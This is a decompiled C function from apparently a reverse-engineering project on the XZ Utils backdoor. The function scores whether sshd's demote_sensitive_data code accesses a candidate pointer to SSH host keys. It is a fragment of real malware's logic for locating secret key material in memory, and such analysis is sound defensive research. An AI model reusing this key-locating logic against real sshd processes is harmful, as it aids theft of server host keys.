// /home/kali/xzre-ghidra/xzregh/103990_sshd_get_sensitive_data_score_in_demote_sensitive_data.c
// Function: sshd_get_sensitive_data_score_in_demote_sensitive_data @ 0x103990
// Calling convention: __stdcall
// Prototype: int __stdcall sshd_get_sensitive_data_score_in_demote_sensitive_data(void * sensitive_data, elf_info_t * elf, string_references_t * refs)


/*
 * AutoDoc: Generated from upstream sources.
 *
 * Source summary (xzre/xzre.h):
 *   @brief obtains a numeric score which indicates if `demote_sensitive_data`
 *   accesses @p sensitive_data or not
 *
 *   @param sensitive_data pointer to suspsected SSH host keys
 *   @param elf sshd elf instance
 *   @param refs info about resolved functions
 *   @return int a score of 3 if accessed, 0 otherwise
 */

int sshd_get_sensitive_data_score_in_demote_sensitive_data
              (void *sensitive_data,elf_info_t *elf,string_references_t *refs)

{
  u8 *code_start;
  BOOL BVar1;
  int iVar2;
  
  code_start = (u8 *)refs->entries[3].func_start;
  if (code_start != (u8 *)0x0) {
    BVar1 = find_instruction_with_mem_operand
                      (code_start,(u8 *)refs->entries[3].func_end,(dasm_ctx_t *)0x0,sensitive_data);
    if (BVar1 == 0) {
      iVar2 = 0;
    }
    else {
      iVar2 = 3;
    }
    return iVar2;
  }
  return 0;
}

